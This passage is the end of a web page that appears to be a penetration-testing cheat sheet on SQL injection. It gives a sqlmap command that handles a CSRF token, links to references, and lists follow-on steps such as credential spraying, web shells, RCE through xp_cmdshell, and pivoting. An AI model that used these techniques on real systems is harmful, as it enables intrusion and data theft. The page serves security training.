+<a class=heading-permalink href=#csrf-token-in-sqlmap aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>For protected endpoints:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sqlmap -r req.txt --csrf-token<span class=o>=</span><span class=s2>&#34;csrf_token&#34;</span> --csrf-url<span class=o>=</span><span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>/login&#34;</span>
+</span></span></code></pre></div><h2 id=xii-references data-heading-permalink=true><span class=heading-content>xii. References</span>
+<a class=heading-permalink href=#xii-references aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><ul><li><a href=https://portswigger.net/web-security/sql-injection/cheat-sheet target=_blank rel="noopener noreferrer">PortSwigger - SQL Injection cheat sheet</a>
+- best single page reference</li><li><a href=https://portswigger.net/web-security/sql-injection target=_blank rel="noopener noreferrer">PortSwigger - SQL injection labs</a></li><li><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection target=_blank rel="noopener noreferrer">PayloadsAllTheThings - SQL Injection</a></li><li><a href=https://book.hacktricks.xyz/pentesting-web/sql-injection target=_blank rel="noopener noreferrer">HackTricks - SQL Injection</a></li><li><a href=https://github.com/sqlmapproject/sqlmap/wiki/Usage target=_blank rel="noopener noreferrer">sqlmap user manual</a></li><li><a href=https://github.com/sqlmapproject/sqlmap/tree/master/tamper target=_blank rel="noopener noreferrer">sqlmap tamper scripts reference</a></li></ul><h2 id=xiii-where-it-leads data-heading-permalink=true><span class=heading-content>xiii. Where it leads</span>
+<a class=heading-permalink href=#xiii-where-it-leads aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><ul><li>Authentication bypass → straight into <a href=/cheatsheets/web/web02-auth--session/>WEB02 Auth & Session</a>
+account takeover</li><li>DB dump → cred reuse spray across all auth surfaces, see <a href=/cheatsheets/active-directory/ad05-password-spraying/>AD05 Password Spraying</a>
+for the wider domain spray</li><li>File write privilege → web shell → <a href=/cheatsheets/linux-pentesting/04-initial-access/>04 Initial Access</a>
+(Linux) or <a href=/cheatsheets/windows/w01-recon--enum/>W01 Recon & Enum</a>
+(Windows)</li><li><code>xp_cmdshell</code> / <code>COPY FROM PROGRAM</code> → direct RCE</li><li>Internal hosts mentioned in DB → pivot target list for <a href=/cheatsheets/misc/pivoting/>Pivoting</a></li></ul></div><nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href=/cheatsheets/web/web02-auth--session/><div class=cheatsheet-pager-copy><span class=cheatsheet-pager-label>Previous</span>
+<span class=cheatsheet-pager-title>Auth & Session</span></div><span class=cheatsheet-pager-arrow aria-hidden=true><svg width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+</span></a><a class="cheatsheet-pager-link is-next" href=/cheatsheets/web/web04-nosql-injection/><div class=cheatsheet-pager-copy><span class=cheatsheet-pager-label>Next</span>
+<span class=cheatsheet-pager-title>NoSQL Injection</span></div><span class=cheatsheet-pager-arrow aria-hidden=true><svg width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg></span></a></nav></div></div></article></main><button class=scroll-top-button type=button data-scroll-top aria-label="Scroll to top" aria-hidden=true tabindex=-1>
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 18V6"/><path d="M6.75 11.25 12 6l5.25 5.25"/></svg></button><footer class=site-footer><p>&copy; 2026 JinPwn</p></footer></body></html>
